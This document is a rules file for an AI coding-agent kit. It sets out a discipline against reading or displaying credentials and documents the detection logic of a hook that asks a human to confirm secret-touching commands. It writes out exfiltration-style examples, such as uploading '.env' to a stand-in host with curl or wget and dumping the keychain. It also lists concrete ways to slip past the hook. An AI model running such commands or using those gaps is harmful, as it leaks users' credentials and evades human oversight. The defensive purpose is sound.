# Secrets discipline (never read, never display, never carry off a credential)

> A rule from kit/loop. Paired with the PreToolUse hook `pre-tool-secrets-guard`, which asks a human to confirm (`ask`) any operation that
> reads a credential, prints its contents, or puts it into version control. SessionStart `session-start-rules` injects "Key points" and UserPromptSubmit `user-prompt-rules`
> injects "Points for every turn" — never duplicate the wording inside the hooks.

## Points for every turn
<!-- looptrack:inject prompt -->

[Secrets discipline] Never read, display, or put into version control a credential (a token, a password, a private key, a TOTP secret, a value from `.env`). Confirm no more than whether it exists, how long it is, and the first characters of its hash. Output cannot be taken back. Full text: secrets-discipline.md in rules.

## Key points
<!-- looptrack:inject session -->

- **Never read the contents of a credential, never display them, never copy them anywhere else.** That covers access tokens, passwords, private keys,
  TOTP secrets, API keys, values from `.env`, and cloud credentials. What you actually want to confirm is almost always covered by
  **whether it exists, how long it is, and the first characters of its hash** (`wc -c`, `shasum | cut -c1-8`).
- **Output cannot be taken back.** Once a secret has appeared in the transcript, a log, or an issue comment, treat it as leaked even if you delete it afterwards.
  Never display one, not even "just once, to check".
- **Never put a secret in a command's arguments** (it stays in the shell history and in the process list). Pass it in a file (`chmod 600`) or on standard input.
- **Never put one into version control.** Add `.env`, `credentials.json`, `*.p12` / `*.pem` / `*.key` to `.gitignore` before you `git add`.
  Once committed, it is hard to get out of the history.
- **When you ask a person or a subagent to check something on a real machine, write this prohibition into the instruction verbatim.** Given the job of finding where the credentials live,
  the person you asked easily decides that showing you the contents is the helpful thing to do.

## Why this is needed

Hand an AI a check on a real machine (installing, logging in, receiving a release) and **the contents end up in the output while it works out where the credentials live**.
Finding out "where the token is" and looking at "the value of that token" are continuous acts, and the boundary between them is easy to miss.
It has really happened twice in one day. The first time, a single-use access token was left in the output; the second time, the output of a keychain
read command was displayed as-is, and the user's real credentials (including ones for other services) ended up in the record.
Neither was sent anywhere external, but both cost the work of revoking and re-authorizing.

## When you find something has leaked

1. **Revoke it** (in that service's admin console; a `looptrack` access token is revoked at `/account`). Stop it before you delete anything.
2. Write down which secret it was, when, and where it was left (the transcript, a log, a commit, an issue).
3. Tell the user **immediately**. Name specifically what has to be logged into or authorized again.
4. Write the prohibition into the instructions or the discipline so the same path is not taken twice.

Never hide it. Fixed quietly, it stays unrevoked.

## How this discipline relates to the hook

`pre-tool-secrets-guard` turns the following into an `ask` (a confirmation, not a refusal). A human decides whether it goes through.

| What it watches | Examples |
| -- | -- |
| Reads from a credential store | `security find-generic-password`, `security dump-keychain`, `secret-tool lookup`, `cmdkey /list` |
| Commands that print the contents of a secret file, or copy it somewhere else | `cat`, `less`, `head`, `grep`, `jq`, `xxd`, `openssl`, `cp`, `mv`, `tee`, `scp`, `rsync`, and the Windows / PowerShell equivalents `type`, `Get-Content`, `findstr`, `Select-String`, `copy`, `Copy-Item` and the like, with `.env`, `credentials.json` or a key as an argument |
| Commands that archive it, send it out, or load it into the environment | `tar`, `zip`, `unzip`, `curl`, `wget`, `source` with a secret file as an argument |
| The inside of a nested shell | the command run inside the quotes of `bash -c '…'`, `sh -c "…"` or `eval "…"` (one level only) |
| An input redirection | `< a secret file` (whatever the command name; `<<`, `<<<` and `<&3` are out of scope) |
| Slipping into version control | `git add` / `git commit` with a secret file as its target |
| Reads and writes from tools | Read / Edit / Write with a secret file as its target |

The decision looks only at **the words that actually run**, so the same **command name** inside quotes or a heredoc does not set it off
(`echo 'do not cat .env'` goes through). What it does look at is **a quoted string whose whole content is a single path**.
Quotes are there to keep the shell from splitting a word (a path with a space in it, `$HOME` expansion), so `cat "$HOME/.env"`
is the same act as `cat ~/.env` and is confirmed. A name that merely appears inside a sentence (`git commit -m "add .env to .gitignore"`) goes through.
A command name may carry the path to its executable (`/bin/cat`, `C:\Windows\System32\findstr.exe`).
Case is ignored only for **a word in command position** (`CAT .env` is confirmed); **a command name** in argument position is matched case-sensitively
(`go test -run Type … .env` does not set it off). That is about command names: **file names and locations are matched case-insensitively**.
The macOS and Windows filesystems do not distinguish case, so `.ENV`, `ID_RSA`, `CREDENTIALS.JSON`, `SERVER.KEY`,
`secret.PEM`, `vault.ASC`, `cert.P12` and `~/.NETRC` name files that really exist, and matching them case-sensitively would let the contents out for real.
The same goes for locations: `Private/`, `Secrets/`, `Keys/` and `.SSH/` are confirmed. The side that goes through (templates and public keys)
ignores case too, so `.ENV.EXAMPLE` and `KEY.PUB` go through, and so does `cp .ENV.EXAMPLE .ENV`.
**What counts as a secret is judged by name and by location.** `.env`, `credentials.json`, `.netrc`, `.pgpass`, `.npmrc`, `.htpasswd`,
SSH keys (`id_` plus the key type: `rsa`, `dsa`, `ecdsa`, `ed25519`, `xmss`, with `_sk` and a trailing word allowed), `.p12`, `.pfx`, `.p8`, `.jks`, `.keystore` and `.gpg` are treated as secrets by name alone.
**`.pem`, `.key` and `.asc` are not treated as secrets unconditionally** (public certificate chains, CA bundles, signatures and documents are the more common case).
**`credentials` with no extension is not treated as a secret unconditionally either** (it is an everyday English word that
turns up as a grep pattern or as part of a URL). That one is judged **by location alone (1. below)**, never by the words in
the name (2.), so `~/.aws/credentials` is confirmed while `docs/credentials` and `grep -rn credentials src/` go through.
They are confirmed only when one of these holds:

1. **The location**: the path contains `.ssh/`, `.gnupg/`, `.aws/`, `private/`, `secrets/`, `keys/`, `pki/` or `letsencrypt/`.
   Except that **a leading `/private/tmp/`, `/private/var/` or `/private/etc/` is dropped**. On macOS those three are the
   real bodies of `/tmp`, `/var` and `/etc`, so a real path (the output of `realpath`, a temporary directory) always carries
   a leading `private/`, and public files like `/private/etc/ssl/cert.pem` (a real, public CA bundle) end up confirmed.
   **Only the leading one** is dropped; a second `private/` still matches as before
   (`/private/etc/ssl/private/server.key` and `/private/tmp/x/private/server.pem` are confirmed).
   Here **"leading" means the one place at the start of the path string**, not "the first `private/` that appears". So neither
   `/private/keys-archive/x.pem` (at the start, but its child is not `tmp|var|etc`) nor `~/proj/private/tmp/x.pem`
   (a `private/tmp/`, but not at the start — the user's own location) **is dropped: both are confirmed**.
   Case is ignored, so `/PRIVATE/TMP/x.pem` and `/Private/tmp/x.pem` are dropped too (the macOS filesystem does not
   distinguish case, and they name the same body). **The limit**: in exchange, a `/Private/tmp/` or `/private/etc/`
   really used as a secret location on Linux is not caught. The judgment carries no branch on the environment, so that limit is accepted.
2. **The name**: the part before the extension contains, **as a word**, something that names a secret (`server`, `client`, `host`, `domain`, `site`,
   `privkey`, `private`, `priv`, `key`, `tls`, `ssl`, `id`, `secret`, `master`, `encryption`, `ca`, `rootca`, `root`,
   `signing`, `sign`, `deploy`, `vault`, `backup`, `token`, `credential(s)`, `encrypt`, `encrypted`). Word boundaries are the start, the end and `.` `_` `-`,
   so **a match inside a longer word does not count**: `design.pem` (`sign`), `pubkey.pem` (`key`), `cacert.pem` (`ca`).

Words that name something public (`fullchain`, `chain`, `bundle`, `intermediate`, `cert`, `certificate`, `cacert`, `pubkey`, `public`) are
**never looked at before the secret-naming words**. Looked at first, a single `cert` would cancel `private`, `secret` or `vault`, and
**real secrets would go through** (`client-cert.pem`, `secret.cert.pem`). Public words are used for exactly two things:

- **When the extension is `.key`**: `.key` names the key itself, so **public words count on the secret side too**
  (`cert.key`, `tls-chain.key` and `ca-cert.key` are TLS private keys). What goes through is only a document with neither kind of word, like `slides.key`.
- **When the extension is `.pem` or `.asc`**: if a public word is present, an overlapping word is dropped from the secret side — but **only one of them**.
  - With `public` or `pubkey` → **only `key`** is dropped (`public-key.asc`, `pubkey-bundle.pem` are public keys). `ca` is not, so `pubkey-ca-key.pem` (a CA key) is confirmed.
  - With any other public word (`cert`, `chain`, `bundle`, `intermediate`, `certificate`, `fullchain`, `cacert`) → **only `ca`** is dropped
    (`ca-bundle.pem`, `intermediate-ca.pem` are public CA bundles). **`key` is not**, so `key-cert.pem`, `cert-key.pem`,
    `ca-key-bundle.pem` (a CA private key) and `key-chain.pem` are **confirmed**. Drop both at once and a single `cert` lets a real private key through.
  - It is a combination of words, not a list, so it also covers variants like `ca-bundle-2026.pem` and `CA-KEY-BUNDLE.pem` (case included).
    `private`, `secret`, `vault` and the rest are never dropped, so those stay confirmed.
- **Run-together compounds** (for `.pem`, `.key` and `.asc` only): judged by word boundaries alone, `privatekey` is a single word and matches
  neither `private` nor `key`. So **a word that contains `key` inside a compound** is confirmed too
  (`privatekey.pem`, `keypair.pem` (the default name for a key pair), `secretkey.pem`, `serverkey.pem`, `sshkey.pem`,
  `apikey.pem`, `signingkey.asc`, `mykey.pem`, `ec2keypair.pem`). What goes through is **only a word that names a public key in its entirety**
  (`pubkey`, `publickey`, `pubkeys`, `publickeys`, `pubkeyring`) — `publickey.pem`, `pubkey.pem`, `pubkeyring.asc`, `pubkey-bundle.pem` —
  and **merely starting with `pub` is not enough**. A single word with a secret-naming word after it
  (`pubprivatekey.pem`, `pubsecretkey.pem`, `publicprivatekey.pem`, `pubserverkey.asc`) is **confirmed**,
  so that it matches the separated form `pubkey-privatekey.pem` (dropping the separator alone used to change the verdict).

When the location matches (1), it is confirmed whatever the name.

Examples — **confirmed**: `cert.key` (the most common name for a TLS private key), `key-cert.pem`, `cert-key.pem`,
`ca-key-bundle.pem` (a CA private key), `key-chain.pem`, `pubkey-ca-key.pem`, `client-cert.pem`, `private-cert.pem`, `secret.cert.pem`,
`privkey-bundle.pem`, `vault-bundle.pem`, `master-chain.key`, `ca-cert.key`, `ca.key`, `rootCA.key`, `deploy_key.pem`, `jwt-signing.pem`, `vault.asc`, `gpg-backup.asc`.
**Go through**: `fullchain.pem`, `ca-bundle.pem`, `chain.pem`, `intermediate.pem`, `intermediate-ca.pem`, `cert.pem`, `cacert.pem`, `ca-cert.pem`,
`pubkey.pem`, `public-key.asc`, `public.asc`, `release.tar.gz.asc` (a release signature), `slides.key` (a document) and `id_token`.
**Most `.asc` files go through** unless the name names a secret (signatures and public keys are the common case).
**The limit**: with neither a secret word nor `key` in the name and an unconventional location (`notes/2026.pem`, say), it **is not caught**.
Compounds like `privatekey.pem` and `pubkey-sshkey.pem` are picked up by the rule above. **That does not mean the limit of telling secrets
apart by name is gone**: the forms listed here are ones that were actually checked, not a guarantee of coverage.
Two things fall the other way, to the confirming side — false positives, but the safer side of the trade:
a public name carrying both `public` and `ca` (`public-ca-bundle.pem`), and a word that just happens to contain `key` (`monkey.pem`).
That is the limit of telling secrets apart by name, and it stays within the hook's remit of catching nothing but slips.
Things that merely look like secrets by name (`.env.example`, `*.pub`) go through.
**Copying from a template goes through** (`cp .env.example .env`). The judgment is made **per simple command**, split on `;`, `&`, `&&`, `||`, `|`, newlines, `(` and `)`:
it goes through only when **that command's source is a template and that command's only secret path is the destination**. Every other command is judged as usual,
so `cp .env.example .env; cat .env` and `cp .env.example /tmp/t && cat ~/.ssh/id_rsa` are confirmed.
`cp .env .env.bak`, `mv .env /tmp/`, `tee .env < .env.example` and `cp .env /tmp/.env.example` are confirmed too.
**When a command has an unterminated quote the separators cannot be trusted, so the template exemption is not used at all** (it falls to the confirming side).
**Unwrapping a nested shell adds one simple command**, so in an artificial form such as `bash -c 'cp .env.example' .env`,
where the source and the destination land in different commands, **the template exemption drops out and it is confirmed** (measured).
`ask` is a confirmation and not a refusal, so the cost is one extra confirmation; that was accepted as-is
(`cp .env.example .env` itself still goes through).
The exception is `LOOPTRACK_LOOP_SECRETS_ALLOW` (whitespace-separated; it is applied **per path**, dropping only the paths it matches,
so one allowed path never lets an unallowed secret on the same line through).

### What it now catches

Every example listed on the catching side is pinned by a test. So is every example listed as going through, except
`sudo -u deploy CAT …` under the seventh item (that one was measured only, and is not in a test).

- **A nested shell**: `bash -c 'cat /tmp/x/.env'`, `sh -c "cat /tmp/x/.env"`, `eval "cat /tmp/x/.env"`,
  `zsh -c 'grep -n token /tmp/x/.env'`, `bash -lc 'cat /tmp/x/.env'`, `bash -ec …`, `bash -xc …`, `sh -lc …`,
  `bash -o pipefail -c 'cat /tmp/x/.env'`. Quoted text is dropped as data, so in a nested shell
  **the one thing that disappears from the text being judged is the command that actually runs**. The quotes are removed
  only when the prefix is `-c` of `bash` / `sh` / `zsh` / `dash`, or `eval` (one level only).
  `echo 'do not cat .env'`, `bash -c "echo hi"` and `bash -c 'ls /tmp'` go through.
- **Archiving and transfer**: `tar czf /tmp/o.tgz /tmp/x/.env`, `zip /tmp/o.zip /tmp/x/.env`, `tar cf - /tmp/x/id_rsa`,
  `curl -T /tmp/x/.env http://example.invalid`, `curl -F f=@/tmp/x/.env http://example.invalid`,
  `wget --post-file=/tmp/x/.env http://example.invalid`. **Only when the secret path is spelled out in the arguments**:
  `curl https://example.invalid/x`, `wget https://example.invalid/x`, `tar cvf /tmp/backup.tar project/` and
  `unzip dist.zip -d /tmp/out` go through.
- **Pulling a remote secret down to the local machine, and `file://`**: `aws s3 cp s3://bucket/.env /tmp/`,
  `aws s3 cp s3://bucket/credentials.json .`, `rsync rsync://host/m/.env /tmp/`,
  `scp scp://user@host/tmp/x/.ssh/id_rsa /tmp/`, `jq . https://x/credentials.json`, `cat sftp://host/.ssh/id_rsa`,
  `curl https://example.invalid/x/id_rsa`, `curl https://example.invalid/x/.env`. A path inside a URL is judged by
  name too, so **the verdict is the same whether or not a scheme is written** (`scp user@host:/tmp/x/.ssh/id_rsa /tmp/`
  is confirmed as well). `file://` is another way of writing a local path, so the prefix is removed and the rest is
  judged the same way (`cat file:///tmp/x/.ssh/id_rsa` and `curl file:///tmp/x/.ssh/id_rsa` are confirmed, while
  `cat file:///private/etc/ssl/cert.pem` goes through because the macOS real-path exclusion applies).
- **An input redirection**: `ruby x.rb < /tmp/x/.env`, `node app.js </tmp/x/.env`, `./upload < /tmp/x/id_rsa`,
  `./tool 3< /tmp/x/.env`. The contents reach that program even with no printing command, so it is judged whatever the
  command name is. A heredoc (`cat <<EOF`), a here-string (`ruby x.rb <<<.env`), a file-descriptor spec
  (`grep x file 2>&1`) and an ordinary file (`sort < /tmp/list.txt`, `ruby x.rb < /tmp/input.txt`) go through.
- **A line continuation**: `cat /tmp/x/.env\` ending in a backslash and a newline (and the wrapped
  `grep -n token \` + newline + `  /tmp/x/.env\` + newline). The word became `.env\`, the basename came out empty,
  and the answer was always "not a secret". When the continuation is not followed by a space
  (`cat /tmp/x/.env\` + newline + `--foo`) the shell joins it into one word naming a different file, so nothing fires.
  Windows paths (`type C:\tmp\notes.txt`, `cat C:\tmp\x.txt`) are not broken.
- **Cloud credentials**: `credentials` with no extension **inside a secret location** (`cat /tmp/x/.aws/credentials`,
  `cp /tmp/x/.aws/credentials /tmp/`, `source /tmp/x/.aws/credentials`, `cat /tmp/x/secrets/credentials`) and
  `.aws/` as a location (`cat /tmp/x/.aws/notes2026.pem`). `credentials.json` is still a secret by name alone.
  **Outside a secret location it goes through** (`cat /tmp/x/credentials`, `sed -n '1,5p' docs/credentials`,
  `grep -rn credentials src/`, `git grep credentials`, `jq .credentials /tmp/a.json`,
  `curl -o /tmp/credentials https://example.invalid/x`), and so do `cat /tmp/x/.aws/config` (configuration, not a
  credential), `credentials.md` and `credentials.txt` (document extensions).
- **`source`**: `source /tmp/x/.env`, `cd app && source .env`, `SOURCE /tmp/x/.env`. It prints nothing, but the values
  go straight into the environment. `source /tmp/x/venv/bin/activate` and `source /tmp/x/.bashrc` go through.
- **An uppercase command name after a prefix word**: `xargs CAT /tmp/x/.env`, `sudo CAT …`, `env CAT …`, `nohup CAT …`,
  `time CAT …`, `command CAT …`, `timeout 30 GET-CONTENT /tmp/x/.env`, `env FOO=1 TYPE /tmp/x/.env`
  (on macOS `CAT` really runs as `/bin/cat` and the contents come out). The prefix words are `sudo`, `doas`, `env`,
  `xargs`, `nohup`, `setsid`, `time`, `command`, `nice`, `stdbuf` and `timeout`. **Only the position right after one of them**
  was widened, so a word in argument position (`go test -run Type … .env`, `npm run copy:env .env`,
  `npm run gc -- .env`) still goes through. An option that takes its value as a separate word
  (`sudo -u deploy CAT …`) cannot be read through as a prefix, so it is not caught.

### What it does not catch (what was decided not to close)

Every one below **was measured** (it does not become a confirmation). None of them is a "we will add it later".

- **Passing a secret path as an argument to some interpreter**: `ruby -e '...' /tmp/x/.env`, `node -e '...' /tmp/x/.env`.
  **Why it is not caught**: the judgment looks at "the words that actually run" with regular expressions, and
  `ruby` and `node` are not commands that print contents.
  **Adding `ruby` and `node` as words is not the road taken.** They are everyday words, so adding them would make
  false positives routine and people would wave the confirmation through — the guard would be hollowed out, which is
  worse than the hole.
- **Building the path out of a variable**: `D=/tmp/x/; cat $D.env`. The string after expansion is invisible to the hook.
- **A glob that hides the name**: `cat /tmp/x/*`, `cat /tmp/x/.en?`. The literal part names no secret.
  **`cat /tmp/x/.env*` and `cat /tmp/x/id_rsa*` are not caught either** (`.env*` and `id_rsa*` do not match the name test).
- **Archiving a whole directory**: `tar czf /tmp/o.tgz .`. The secret file name never appears in the arguments,
  so telling secrets apart by name cannot reach it by construction.
- **Loading with `.` (dot)**: `. /tmp/x/.env`. `.` is a single character, so treating it as a word in a regular
  expression makes it impossible to predict where it would fire (`source` has been added).
- **A nested shell two or more levels deep**: `bash -c "bash -c 'cat /tmp/x/.env'"`. Removing the quotes is
  **limited to one level, and only for a shell's `-c` or `eval`**, by design. Unwrapping level after level would
  add forms that fire on nothing but an ordinary sentence inside quotes.
- **Handing it to a remote shell**: `ssh host 'cat /tmp/x/.env'`. It is a path by which a remote secret ends up in the
  local transcript, but the expansion is **one level, for a shell's `-c` or `eval` only**, by that same design, and
  `ssh` is not in that set. **Handed over in the `-c` form, however — `ssh host bash -c 'cat /tmp/x/.env'`,
  `docker run img bash -c '…'` — it is confirmed** (measured). The secrets guard **unwraps a nested shell whatever the
  position**, so it matches even in argument position. `ask` is something a person can wave through, so it is tilted
  towards matching widely and missing less (**only the git guard, where `deny` stops the work, is limited to command position**).
- **A URL whose path merely contains `credentials`**: `curl https://example.invalid/v1/credentials`,
  `aws s3 cp s3://bucket/credentials /tmp/`, `curl -o /tmp/credentials https://example.invalid/x`,
  `git clone ssh://git@example.invalid/x/secrets.git`. `credentials` with no extension counts as a secret
  **only inside a secret location**, so it does not match when it turns up in the path of a URL.
- **What runs inside a command substitution (`$(…)` inside double quotes, and backquotes)**: `echo "$(cat /tmp/x/.ssh/id_rsa)"`,
  `` echo `cat /tmp/x/.env` ``. Text inside double quotes is dropped as data, and a backquote is not counted as a word
  boundary, so the command that actually runs inside the substitution disappears from the text being judged. A `$(…)`
  outside quotes (`echo $(cat /tmp/x/.env)`) is split at the `(` and is confirmed.
- **Wrapping it between quotes escaped with a backslash**: `cp .env.example x\" ; cat /tmp/x/id_rsa \"`.
  The step that drops quoted text counts `\"` as a quote pair too, so the command between them disappears from the text
  being judged (to the shell they are not quotes, and `cat` runs as written).

The hook catches nothing but slips, and is no substitute for the discipline. A secret it cannot tell by name (a temporary file made during the work,
a value mixed into some output) is not caught.
